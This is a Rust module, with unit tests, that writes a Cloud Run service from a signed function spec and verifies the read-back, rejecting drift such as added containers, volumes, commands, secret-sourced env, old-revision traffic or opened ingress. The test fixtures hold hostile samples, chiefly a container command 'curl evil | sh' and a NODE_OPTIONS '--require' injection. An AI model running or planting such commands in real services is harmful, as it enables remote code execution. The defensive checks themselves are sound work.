//! Write a planned function as a Cloud Run service and check it reads back
//! the same.
//!
//! The verifier sends the whole service template it built, so a field the
//! control plane set behind its back (a second container, a volume, a
//! command, another service account) is replaced, and the read-back refuses
//! any field it doesn't know.

use std::collections::BTreeMap;
use std::time::Duration;

use alien_error::AlienError;
use async_trait::async_trait;
use serde_json::{json, Value};

use crate::error::{ErrorData, Result};
use crate::plan::{FunctionSpec, SetupNetwork};

/// The Cloud Run calls the verifier makes.
#[async_trait]
pub trait ServiceStore: Send + Sync {
    /// GET the service, exactly as returned.
    async fn get(&self, name: &str) -> Result<Value>;
    /// PATCH the service with `service`, replacing its template.
    async fn replace(&self, name: &str, service: &Value) -> Result<()>;
    /// GET the service, or `None` when it doesn't exist or isn't one setup gave the verifier.
    async fn find(&self, name: &str) -> Result<Option<Value>>;
    /// The service's IAM policy.
    async fn policy(&self, name: &str) -> Result<Value>;
    /// Replace the service's IAM policy with `policy`, which carries the etag it was read at.
    async fn set_policy(&self, name: &str, policy: &Value) -> Result<()>;
}

/// The role a private service's own account needs: Pub/Sub and Cloud Scheduler sign their
/// requests as it.
const INVOKER: &str = "roles/run.invoker";

/// The service body the verifier writes for `spec`.
pub fn service_body(spec: &FunctionSpec) -> Value {
    let env: Vec<Value> = spec
        .env
        .iter()
        .map(|(name, value)| json!({"name": name, "value": value}))
        .collect();
    let mut service = json!({
        "template": {
            "serviceAccount": spec.run_as,
            "timeout": format!("{}s", spec.timeout_seconds),
            "containers": [{
                "image": spec.image_uri,
                "env": env,
                // CPU only while serving requests: Cloud Run refuses less
                // than 512Mi with CPU always allocated.
                "resources": {
                    "limits": {"memory": format!("{}Mi", spec.memory_mb), "cpu": "1"},
                    "cpuIdle": true,
                },
            }],
        },
        // Every request goes to the revision this template creates; no
        // older revision stays reachable by a split or a tag.
        "traffic": [{"type": "TRAFFIC_TARGET_ALLOCATION_TYPE_LATEST", "percent": 100}],
        // The body replaces the service, so it always carries who may reach it: a field left
        // out takes its default, ingress from anywhere. Only a workload the signed stack
        // makes public takes requests from the internet, without the invoker check.
        "ingress": ingress(spec),
        "invokerIamDisabled": spec.public,
    });
    if let Some(vpc) = &spec.vpc {
        service["template"]["vpcAccess"] = vpc_access(vpc);
    }
    service
}

/// Where `spec`'s service takes requests from.
fn ingress(spec: &FunctionSpec) -> &'static str {
    if spec.public {
        "INGRESS_TRAFFIC_ALL"
    } else {
        "INGRESS_TRAFFIC_INTERNAL_ONLY"
    }
}

/// Direct VPC egress through the subnet setup gives functions.
fn vpc_access(vpc: &SetupNetwork) -> Value {
    let interfaces: Vec<Value> = vpc
        .subnet_ids
        .iter()
        .map(|subnet| {
            // Setup gives the subnet's self link; Cloud Run takes its `projects/...` path.
            let path = match subnet.split_once("/projects/") {
                Some((_, rest)) => format!("projects/{rest}"),
                None => subnet.clone(),
            };
            let mut interface = json!({ "subnetwork": path });
            if !vpc.security_group_ids.is_empty() {
                interface["tags"] = json!(vpc.security_group_ids);
            }
            interface
        })
        .collect();
    json!({
        "networkInterfaces": interfaces,
        "egress": vpc.egress.as_deref().unwrap_or("ALL_TRAFFIC"),
    })
}

/// The subnets (by name), network tags and egress of a template's `vpcAccess`, as setup's
/// network and what Cloud Run reads back compare.
fn network_of(vpc_access: &Value) -> Option<(Vec<String>, Vec<String>, String)> {
    let interfaces = vpc_access["networkInterfaces"].as_array()?;
    if interfaces.is_empty() {
        return None;
    }
    let name = |path: &str| path.rsplit('/').next().unwrap_or(path).to_string();
    let mut subnets = Vec::new();
    let mut tags = Vec::new();
    for interface in interfaces {
        subnets.push(name(interface["subnetwork"].as_str().unwrap_or_default()));
        for tag in interface["tags"].as_array().into_iter().flatten() {
            tags.push(tag.as_str().unwrap_or_default().to_string());
        }
    }
    subnets.sort();
    tags.sort();
    tags.dedup();
    let egress = vpc_access["egress"]
        .as_str()
        .unwrap_or("PRIVATE_RANGES_ONLY")
        .to_string();
    Some((subnets, tags, egress))
}

const UPDATE_WAIT: Duration = Duration::from_secs(300);
const POLL: Duration = Duration::from_secs(3);

/// Write `spec` and read it back. Setup creates each worker's service, closed, and the verifier
/// may write only those: one that doesn't exist is refused, so a release that adds a worker
/// waits for the setup update that creates its service. A public worker is opened here; a
/// private one admits its own account as invoker.
pub async fn apply(store: &dyn ServiceStore, spec: &FunctionSpec) -> Result<Value> {
    if store.find(&spec.name).await?.is_none() {
        return Err(AlienError::new(ErrorData::Refused {
            reason: format!(
                "worker '{}' has no Cloud Run service {} that setup gave the verifier: on GCP, setup creates each worker's service, and this install's setup predates the worker. Apply this release's signed setup update, then deploy again (its grant can take a minute to reach Cloud Run)",
                spec.workload, spec.name
            ),
        }));
    }
    store.replace(&spec.name, &service_body(spec)).await?;
    let service = settled(store, spec).await?;
    if !spec.public {
        admit_own_account(store, spec).await?;
    }
    Ok(service)
}

/// Grant the service's own account the invoker role, unless the policy holds it already.
async fn admit_own_account(store: &dyn ServiceStore, spec: &FunctionSpec) -> Result<()> {
    let member = format!("serviceAccount:{}", spec.run_as);
    let mut policy = store.policy(&spec.name).await?;
    let bindings = policy["bindings"].as_array().cloned().unwrap_or_default();
    let admitted = bindings.iter().any(|binding| {
        binding["role"] == INVOKER
            && binding.get("condition").is_none()
            && binding["members"]
                .as_array()
                .is_some_and(|members| members.iter().any(|existing| existing == &json!(member)))
    });
    if admitted {
        return Ok(());
    }
    let mut bindings = bindings;
    bindings.push(json!({"role": INVOKER, "members": [member]}));
    policy["bindings"] = Value::Array(bindings);
    store.set_policy(&spec.name, &policy).await
}

/// Wait for the service to finish reconciling, then check it reads back as `spec`.
async fn settled(store: &dyn ServiceStore, spec: &FunctionSpec) -> Result<Value> {
    let deadline = tokio::time::Instant::now() + UPDATE_WAIT;
    loop {
        let service = store.get(&spec.name).await?;
        let reconciling = service["reconciling"].as_bool().unwrap_or(false);
        if !reconciling {
            check_read_back(spec, &service)?;
            return Ok(service);
        }
        if tokio::time::Instant::now() > deadline {
            return Err(AlienError::new(ErrorData::CloudCallFailed {
                operation: format!("waiting for service {} to finish updating", spec.name),
            }));
        }
        tokio::time::sleep(POLL).await;
    }
}

/// Template keys the verifier understands.
const KNOWN_TEMPLATE: &[&str] = &[
    // The tool that last deployed the template, for display only.
    "client",
    "clientVersion",
    "revision",
    "labels",
    "annotations",
    "scaling",
    "vpcAccess",
    "timeout",
    "serviceAccount",
    "containers",
    "volumes",
    "executionEnvironment",
    "encryptionKey",
    "maxInstanceRequestConcurrency",
    "sessionAffinity",
    "healthCheckDisabled",
    "nodeSelector",
    "gpuZonalRedundancyDisabled",
];
/// Container keys the verifier understands.
const KNOWN_CONTAINER: &[&str] = &[
    "name",
    "image",
    "command",
    "args",
    "env",
    "resources",
    "ports",
    "volumeMounts",
    "workingDir",
    "livenessProbe",
    "startupProbe",
    "dependsOn",
    "baseImageUri",
    "buildInfo",
];

/// Whether `value` carries nothing: null, false, an empty string, array or object.
fn is_empty(value: &Value) -> bool {
    match value {
        Value::Null | Value::Bool(false) => true,
        Value::String(text) => text.is_empty(),
        Value::Array(items) => items.is_empty(),
        Value::Object(fields) => fields.values().all(is_empty),
        _ => false,
    }
}

/// Check that a Cloud Run service is the one `spec` describes.
pub fn check_read_back(spec: &FunctionSpec, service: &Value) -> Result<()> {
    let mismatch = |reason: String| {
        AlienError::new(ErrorData::ReadBackMismatch {
            function: spec.name.clone(),
            reason,
        })
    };
    let unknown = |section: &str, value: &Value, known: &[&str]| -> Result<()> {
        let fields = value
            .as_object()
            .ok_or_else(|| mismatch(format!("{section} is not an object")))?;
        for (key, value) in fields {
            if !known.contains(&key.as_str()) && !is_empty(value) {
                return Err(mismatch(format!(
                    "{section} has field {key}, which the verifier doesn't know"
                )));
            }
        }
        Ok(())
    };
    if service["ingress"].as_str() != Some(ingress(spec)) {
        return Err(mismatch(format!(
            "its ingress is {}, not {}",
            service["ingress"],
            ingress(spec)
        )));
    }
    if service["invokerIamDisabled"].as_bool().unwrap_or(false) != spec.public {
        return Err(mismatch(format!(
            "its invokerIamDisabled is {}",
            service["invokerIamDisabled"]
        )));
    }
    let template = &service["template"];
    unknown("the template", template, KNOWN_TEMPLATE)?;
    let containers = template["containers"]
        .as_array()
        .ok_or_else(|| mismatch("it has no containers".to_string()))?;
    let [container] = containers.as_slice() else {
        return Err(mismatch(format!("it has {} containers", containers.len())));
    };
    unknown("the container", container, KNOWN_CONTAINER)?;

    let text = |value: &Value| value.as_str().unwrap_or_default().to_string();
    if container["image"].as_str() != Some(spec.image_uri.as_str()) {
        return Err(mismatch(format!(
            "it runs image {}",
            text(&container["image"])
        )));
    }
    if template["serviceAccount"].as_str() != Some(spec.run_as.as_str()) {
        return Err(mismatch(format!(
            "it runs as {}",
            text(&template["serviceAccount"])
        )));
    }
    if template["timeout"].as_str() != Some(format!("{}s", spec.timeout_seconds).as_str()) {
        return Err(mismatch(format!("timeout is {}", template["timeout"])));
    }
    if container["resources"]["limits"]["memory"].as_str()
        != Some(format!("{}Mi", spec.memory_mb).as_str())
    {
        return Err(mismatch(format!(
            "memory is {}",
            container["resources"]["limits"]["memory"]
        )));
    }
    let mut env = BTreeMap::new();
    for item in container["env"].as_array().cloned().unwrap_or_default() {
        let name = text(&item["name"]);
        // A value read from a secret is code the release didn't sign.
        if !is_empty(&item["valueSource"]) {
            return Err(mismatch(format!("env {name} is read from a secret")));
        }
        env.insert(name, text(&item["value"]));
    }
    if env != spec.env {
        return Err(mismatch(format!(
            "env differs for {:?}",
            crate::plan::changed_env(&env, &spec.env)
        )));
    }
    for field in ["command", "args", "volumeMounts", "workingDir", "dependsOn"] {
        if !is_empty(&container[field]) {
            return Err(mismatch(format!("its container sets {field}")));
        }
    }
    if !is_empty(&template["volumes"]) {
        return Err(mismatch("it mounts volumes".to_string()));
    }
    let network = network_of(&template["vpcAccess"]);
    if network
        != spec
            .vpc
            .as_ref()
            .and_then(|vpc| network_of(&vpc_access(vpc)))
    {
        return Err(mismatch(format!(
            "its network is {}, not the one setup gives functions",
            template["vpcAccess"]
        )));
    }
    check_serving(service).map_err(mismatch)
}

/// The last path segment of a revision name.
fn short_name(name: &str) -> &str {
    name.rsplit('/').next().unwrap_or(name)
}

/// Refuse a service that doesn't serve all traffic from the revision its
/// template created, or whose revision isn't ready: the template reading
/// back right says nothing about what answers requests.
fn check_serving(service: &Value) -> std::result::Result<(), String> {
    let created = service["latestCreatedRevision"]
        .as_str()
        .filter(|name| !name.is_empty())
        .ok_or("it names no created revision")?;
    let ready = service["latestReadyRevision"].as_str().unwrap_or_default();
    if ready != created {
        return Err(format!(
            "revision {} is not ready (the latest ready one is '{}')",
            short_name(created),
            short_name(ready)
        ));
    }
    let condition = &service["terminalCondition"];
    if condition["type"].as_str() != Some("Ready")
        || condition["state"].as_str() != Some("CONDITION_SUCCEEDED")
    {
        return Err(format!("the service is not ready: {condition}"));
    }
    let statuses = service["trafficStatuses"]
        .as_array()
        .ok_or("it reports no traffic")?;
    let [status] = statuses.as_slice() else {
        return Err(format!(
            "traffic is split or tagged over {} targets",
            statuses.len()
        ));
    };
    let revision = status["revision"].as_str().unwrap_or_default();
    let to_created = revision == short_name(created)
        || (revision.is_empty()
            && status["type"].as_str() == Some("TRAFFIC_TARGET_ALLOCATION_TYPE_LATEST"));
    if !to_created || status["percent"].as_i64() != Some(100) {
        return Err(format!(
            "traffic goes to {status}, not 100% to revision {}",
            short_name(created)
        ));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::fixtures::DIGEST;
    use std::sync::Mutex;

    fn spec() -> FunctionSpec {
        FunctionSpec {
            workload: "api".into(),
            vpc: None,
            name: "acme-fn-api".into(),
            image_uri: format!("us-central1-docker.pkg.dev/p/acme/api@{DIGEST}"),
            digest: DIGEST.into(),
            env: BTreeMap::from([("MODE".into(), "signed".into())]),
            memory_mb: 512,
            timeout_seconds: 30,
            architecture: "x86_64".into(),
            run_as: "acme-execution@p.iam.gserviceaccount.com".into(),
            public: false,
            dapr: false,
            registry: None,
            reserved_concurrency: None,
            invoke_grants: Vec::new(),
        }
    }

    /// A service as Cloud Run returns it once the verifier's body is applied.
    fn service(spec: &FunctionSpec) -> Value {
        let mut service = service_body(spec);
        service["name"] = json!(format!(
            "projects/p/locations/us-central1/services/{}",
            spec.name
        ));
        service["reconciling"] = json!(false);
        service["latestCreatedRevision"] = json!(format!(
            "projects/p/locations/us-central1/services/{}/revisions/{}-00002-x7k",
            spec.name, spec.name
        ));
        service["latestReadyRevision"] = service["latestCreatedRevision"].clone();
        service["terminalCondition"] = json!({"type": "Ready", "state": "CONDITION_SUCCEEDED"});
        service["trafficStatuses"] = json!([{
            "type": "TRAFFIC_TARGET_ALLOCATION_TYPE_LATEST",
            "revision": format!("{}-00002-x7k", spec.name),
            "percent": 100,
        }]);
        let template = &mut service["template"];
        template["scaling"] = json!({"maxInstanceCount": 100});
        template["maxInstanceRequestConcurrency"] = json!(80);
        template["containers"][0]["name"] = json!("api-1");
        template["containers"][0]["ports"] = json!([{"name": "http1", "containerPort": 8080}]);
        template["containers"][0]["startupProbe"] = json!({"tcpSocket": {"port": 8080}});
        template["containers"][0]["resources"]["startupCpuBoost"] = json!(true);
        template["client"] = json!("gcloud");
        template["clientVersion"] = json!("586.0.0");
        // A field Cloud Run added that the verifier doesn't know, still empty.
        template["sandboxes"] = json!({});
        service
    }

    /// `spec` in the subnet setup gives functions.
    fn in_network(mut spec: FunctionSpec) -> FunctionSpec {
        spec.vpc = Some(SetupNetwork {
            subnet_ids: vec![
                "https://www.googleapis.com/compute/v1/projects/p/regions/us-central1/subnetworks/acme-workload"
                    .into(),
            ],
            security_group_ids: Vec::new(),
            identity: None,
            egress: Some("ALL_TRAFFIC".into()),
        });
        spec
    }

    #[test]
    fn a_function_in_the_install_network_sends_its_traffic_through_it() {
        let spec = in_network(spec());
        assert_eq!(
            service_body(&spec)["template"]["vpcAccess"],
            json!({
                "networkInterfaces": [{
                    "subnetwork": "projects/p/regions/us-central1/subnetworks/acme-workload"
                }],
                "egress": "ALL_TRAFFIC",
            })
        );
        // As Cloud Run reads it back: the network filled in, the subnet by name.
        let read = |vpc_access: Value| {
            let mut service = service(&spec);
            service["template"]["vpcAccess"] = vpc_access;
            service
        };
        let as_set = json!({
            "networkInterfaces": [{"network": "acme-net", "subnetwork": "acme-workload"}],
            "egress": "ALL_TRAFFIC",
        });
        check_read_back(&spec, &read(as_set.clone())).unwrap();

        let reason = |vpc_access: Value| {
            check_read_back(&spec, &read(vpc_access))
                .expect_err("must not match")
                .to_string()
        };
        assert!(reason(json!({})).contains("network"), "taken out of it");
        let mut other_subnet = as_set.clone();
        other_subnet["networkInterfaces"][0]["subnetwork"] = json!("elsewhere");
        assert!(reason(other_subnet).contains("network"), "moved");
        let mut private_only = as_set.clone();
        private_only["egress"] = json!("PRIVATE_RANGES_ONLY");
        assert!(reason(private_only).contains("network"), "egress narrowed");

        // A function setup puts in no network isn't in one.
        let mut joined = service(&self::spec());
        joined["template"]["vpcAccess"] = as_set;
        assert!(check_read_back(&self::spec(), &joined)
            .expect_err("must not match")
            .to_string()
            .contains("network"));
    }

    #[test]
    fn the_service_as_built_reads_back() {
        check_read_back(&spec(), &service(&spec())).unwrap();
    }

    #[test]
    fn a_service_changed_behind_the_verifier_is_caught() {
        let reason = |change: &dyn Fn(&mut Value)| {
            let mut changed = service(&spec());
            change(&mut changed);
            check_read_back(&spec(), &changed)
                .expect_err("must not match")
                .to_string()
        };
        assert!(
            reason(&|s| s["template"]["containers"][0]["env"][0]["value"] = json!("attacker"))
                .contains("env differs")
        );
        assert!(reason(&|s| s["template"]["containers"][0]["env"]
            .as_array_mut()
            .unwrap()
            .push(json!({"name": "NODE_OPTIONS", "value": "--require /tmp/x"})))
        .contains("NODE_OPTIONS"));
        assert!(reason(&|s| s["template"]["containers"][0]["env"][0] =
            json!({"name": "MODE", "valueSource": {"secretKeyRef": {"secret": "x"}}}))
        .contains("read from a secret"));
        assert!(reason(
            &|s| s["template"]["serviceAccount"] = json!("owner@p.iam.gserviceaccount.com")
        )
        .contains("runs as"));
        assert!(
            reason(&|s| s["template"]["containers"][0]["command"] = json!(["/bin/sh"]))
                .contains("sets command")
        );
        assert!(reason(&|s| s["template"]["containers"]
            .as_array_mut()
            .unwrap()
            .push(json!({"image": "evil"})))
        .contains("2 containers"));
        assert!(reason(
            &|s| s["template"]["volumes"] = json!([{"name": "v", "gcs": {"bucket": "b"}}])
        )
        .contains("volumes"));
    }

    #[test]
    fn only_the_created_and_ready_revision_may_serve() {
        let reason = |change: &dyn Fn(&mut Value)| {
            let mut changed = service(&spec());
            change(&mut changed);
            crate::describe(&check_read_back(&spec(), &changed).expect_err("must not match"))
        };
        // Attack: keep 90% of requests on an older revision that runs
        // another image.
        assert_eq!(
            reason(&|s| s["trafficStatuses"] = json!([
                {"type": "TRAFFIC_TARGET_ALLOCATION_TYPE_REVISION", "revision": "acme-fn-api-00001-old", "percent": 90},
                {"type": "TRAFFIC_TARGET_ALLOCATION_TYPE_LATEST", "revision": "acme-fn-api-00002-x7k", "percent": 10},
            ])),
            "Function 'acme-fn-api' does not match its signed release: traffic is split or tagged over 2 targets"
        );
        // Attack: all traffic pinned to the older revision.
        assert!(reason(&|s| s["trafficStatuses"] = json!([
            {"type": "TRAFFIC_TARGET_ALLOCATION_TYPE_REVISION", "revision": "acme-fn-api-00001-old", "percent": 100},
        ]))
        .contains("not 100% to revision acme-fn-api-00002-x7k"));
        // Attack: a tag keeps the old revision reachable at its own URL.
        assert!(reason(&|s| s["trafficStatuses"]
            .as_array_mut()
            .unwrap()
            .push(json!({"type": "TRAFFIC_TARGET_ALLOCATION_TYPE_REVISION", "revision": "acme-fn-api-00001-old", "tag": "old"})))
        .contains("split or tagged over 2 targets"));
        // The new revision failed to start; the old one still serves.
        assert!(reason(&|s| s["latestReadyRevision"] = json!(
            "projects/p/locations/us-central1/services/acme-fn-api/revisions/acme-fn-api-00001-old"
        ))
        .contains("revision acme-fn-api-00002-x7k is not ready (the latest ready one is 'acme-fn-api-00001-old')"));
        assert!(
            reason(&|s| s["terminalCondition"]["state"] = json!("CONDITION_FAILED"))
                .contains("the service is not ready")
        );
    }

    /// What Cloud Run returned for a service with two revisions, before and
    /// after the verifier's PATCH (us-central1, 2026-11-05).
    #[test]
    fn real_traffic_reports_read_as_cloud_run_returns_them() {
        let revisions = "projects/p/locations/us-central1/services/acme-fn-api/revisions";
        let mut split = service(&spec());
        split["latestCreatedRevision"] = json!(format!("{revisions}/acme-fn-api-00002-cqd"));
        split["latestReadyRevision"] = split["latestCreatedRevision"].clone();
        split["terminalCondition"] = json!({"type": "Ready", "state": "CONDITION_SUCCEEDED", "lastTransitionTime": "2026-11-05T14:28:54.447929Z"});
        split["trafficStatuses"] = json!([
            {"type": "TRAFFIC_TARGET_ALLOCATION_TYPE_REVISION", "revision": "acme-fn-api-00001-k95", "percent": 90},
            {"type": "TRAFFIC_TARGET_ALLOCATION_TYPE_LATEST", "revision": "acme-fn-api-00002-cqd", "percent": 10},
        ]);
        assert!(check_read_back(&spec(), &split).is_err());

        let mut patched = split;
        patched["latestCreatedRevision"] = json!(format!("{revisions}/acme-fn-api-00003-bj6"));
        patched["latestReadyRevision"] = patched["latestCreatedRevision"].clone();
        patched["trafficStatuses"] = json!([
            {"type": "TRAFFIC_TARGET_ALLOCATION_TYPE_LATEST", "revision": "acme-fn-api-00003-bj6", "percent": 100},
        ]);
        check_read_back(&spec(), &patched).unwrap();
    }

    #[test]
    fn a_field_the_verifier_does_not_know_refuses_the_service() {
        let mut service = service(&spec());
        service["template"]["containers"][0]["sidecarMagic"] = json!({"enabled": true});
        let error = check_read_back(&spec(), &service).unwrap_err().to_string();
        assert!(
            error.contains("sidecarMagic, which the verifier doesn't know"),
            "{error}"
        );
    }

    struct FakeRun {
        service: Mutex<Option<Value>>,
        policy: Mutex<Value>,
        calls: Mutex<Vec<String>>,
    }

    impl FakeRun {
        fn holding(service: Value, policy: Value) -> Self {
            Self {
                service: Mutex::new(Some(service)),
                policy: Mutex::new(policy),
                calls: Mutex::new(Vec::new()),
            }
        }

        fn empty() -> Self {
            Self {
                service: Mutex::new(None),
                policy: Mutex::new(json!({"etag": "e1"})),
                calls: Mutex::new(Vec::new()),
            }
        }

        fn serving(&self, body: &Value) {
            let mut held = self.service.lock().unwrap();
            let current = held.as_mut().expect("setup created the service");
            current["template"] = body["template"].clone();
            current["trafficStatuses"] = json!([{
                "type": "TRAFFIC_TARGET_ALLOCATION_TYPE_LATEST",
                "revision": "acme-fn-api-00002-x7k",
                "percent": 100,
            }]);
        }
    }

    #[async_trait]
    impl ServiceStore for FakeRun {
        async fn get(&self, _name: &str) -> Result<Value> {
            Ok(self.service.lock().unwrap().clone().unwrap())
        }
        async fn find(&self, _name: &str) -> Result<Option<Value>> {
            Ok(self.service.lock().unwrap().clone())
        }
        /// As Cloud Run's v2 PATCH: the body replaces the service, so a field it leaves out
        /// takes its default (ingress from anywhere, the invoker check on).
        async fn replace(&self, name: &str, body: &Value) -> Result<()> {
            self.calls.lock().unwrap().push(format!("replace {name}"));
            self.serving(body);
            let mut held = self.service.lock().unwrap();
            let current = held.as_mut().unwrap();
            current["ingress"] = match &body["ingress"] {
                Value::Null => json!("INGRESS_TRAFFIC_ALL"),
                ingress => ingress.clone(),
            };
            current["invokerIamDisabled"] = match &body["invokerIamDisabled"] {
                Value::Null => json!(false),
                disabled => disabled.clone(),
            };
            Ok(())
        }
        async fn policy(&self, _name: &str) -> Result<Value> {
            Ok(self.policy.lock().unwrap().clone())
        }
        async fn set_policy(&self, name: &str, policy: &Value) -> Result<()> {
            self.calls
                .lock()
                .unwrap()
                .push(format!("setIamPolicy {name} {}", policy["bindings"]));
            *self.policy.lock().unwrap() = policy.clone();
            Ok(())
        }
    }

    fn invoker() -> Value {
        json!({"role": "roles/run.invoker", "members": [format!("serviceAccount:{}", spec().run_as)]})
    }

    #[tokio::test]
    async fn apply_replaces_the_whole_template() {
        let mut drifted = service(&spec());
        drifted["template"]["containers"][0]["command"] =
            json!(["/bin/sh", "-c", "curl evil | sh"]);
        drifted["template"]["volumes"] = json!([{"name": "v", "gcs": {"bucket": "b"}}]);
        drifted["trafficStatuses"] = json!([
            {"type": "TRAFFIC_TARGET_ALLOCATION_TYPE_REVISION", "revision": "acme-fn-api-00001-old", "percent": 100},
        ]);
        let run = FakeRun::holding(drifted, json!({"etag": "e1", "bindings": [invoker()]}));
        apply(&run, &spec()).await.unwrap();
        check_read_back(&spec(), run.service.lock().unwrap().as_ref().unwrap()).unwrap();
        assert_eq!(
            *run.calls.lock().unwrap(),
            ["replace acme-fn-api"],
            "the invoker already holds the role"
        );
    }

    /// An update replaces the service, so it must carry the signed ingress: a private worker
    /// stays reachable only from inside the project, a public one stays open. (On real GCP an
    /// update that left ingress out turned a private worker's ingress to all traffic.)
    #[tokio::test]
    async fn an_update_keeps_the_signed_ingress() {
        let mut private = service(&spec());
        private["ingress"] = json!("INGRESS_TRAFFIC_INTERNAL_ONLY");
        let run = FakeRun::holding(private, json!({"etag": "e1", "bindings": [invoker()]}));
        apply(&run, &spec()).await.unwrap();
        let held = run.service.lock().unwrap().clone().unwrap();
        assert_eq!(held["ingress"], json!("INGRESS_TRAFFIC_INTERNAL_ONLY"));
        assert_eq!(held["invokerIamDisabled"], json!(false));

        let public_spec = FunctionSpec {
            public: true,
            ..spec()
        };
        let mut public = service(&public_spec);
        public["ingress"] = json!("INGRESS_TRAFFIC_ALL");
        public["invokerIamDisabled"] = json!(true);
        let run = FakeRun::holding(public, json!({"etag": "e1"}));
        apply(&run, &public_spec).await.unwrap();
        let held = run.service.lock().unwrap().clone().unwrap();
        assert_eq!(held["ingress"], json!("INGRESS_TRAFFIC_ALL"));
        assert_eq!(held["invokerIamDisabled"], json!(true));
    }

    /// A private worker whose ingress was opened, or whose invoker check was turned off,
    /// doesn't read back as signed.
    #[test]
    fn a_private_service_opened_behind_the_verifier_is_caught() {
        for (field, value) in [
            ("ingress", json!("INGRESS_TRAFFIC_ALL")),
            ("invokerIamDisabled", json!(true)),
        ] {
            let mut opened = service(&spec());
            opened[field] = value;
            let error = check_read_back(&spec(), &opened)
                .expect_err("a private worker must stay private")
                .to_string();
            assert!(error.contains(field), "{error}");
        }
    }

    /// A service as setup creates it: the placeholder image, internal ingress, the invoker
    /// check on, and nobody admitted yet.
    fn as_setup_creates() -> Value {
        let mut created = service(&spec());
        created["template"]["containers"][0]["image"] =
            json!("us-docker.pkg.dev/cloudrun/container/hello@sha256:1fde");
        created["ingress"] = json!("INGRESS_TRAFFIC_INTERNAL_ONLY");
        created["invokerIamDisabled"] = json!(false);
        created
    }

    /// The verifier writes only the services setup created: a release that adds a worker is
    /// refused, naming the worker and the setup update, and nothing is written.
    #[tokio::test]
    async fn a_worker_without_a_setup_created_service_is_refused() {
        let run = FakeRun::empty();
        let error = apply(&run, &spec()).await.unwrap_err();
        assert_eq!(error.code, "VERIFIER_REFUSED");
        let reason = error.to_string();
        assert!(
            reason.contains("worker 'api' has no Cloud Run service acme-fn-api")
                && reason.contains("signed setup update"),
            "{reason}"
        );
        assert!(run.calls.lock().unwrap().is_empty());
    }

    #[tokio::test]
    async fn a_private_worker_stays_closed_and_its_account_may_invoke_it() {
        let run = FakeRun::holding(as_setup_creates(), json!({"etag": "e1"}));
        apply(&run, &spec()).await.unwrap();
        check_read_back(&spec(), run.service.lock().unwrap().as_ref().unwrap()).unwrap();
        assert_eq!(
            *run.calls.lock().unwrap(),
            [
                "replace acme-fn-api".to_string(),
                format!("setIamPolicy acme-fn-api {}", json!([invoker()])),
            ]
        );
        assert_eq!(
            run.policy.lock().unwrap()["etag"],
            json!("e1"),
            "written at the etag read"
        );
    }

    #[tokio::test]
    async fn a_public_worker_is_opened_without_invoker_grants() {
        let public = FunctionSpec {
            public: true,
            ..spec()
        };
        let run = FakeRun::holding(as_setup_creates(), json!({"etag": "e1"}));
        apply(&run, &public).await.unwrap();
        let held = run.service.lock().unwrap().clone().unwrap();
        assert_eq!(held["ingress"], json!("INGRESS_TRAFFIC_ALL"));
        assert_eq!(held["invokerIamDisabled"], json!(true));
        assert_eq!(*run.calls.lock().unwrap(), ["replace acme-fn-api"]);
    }
}
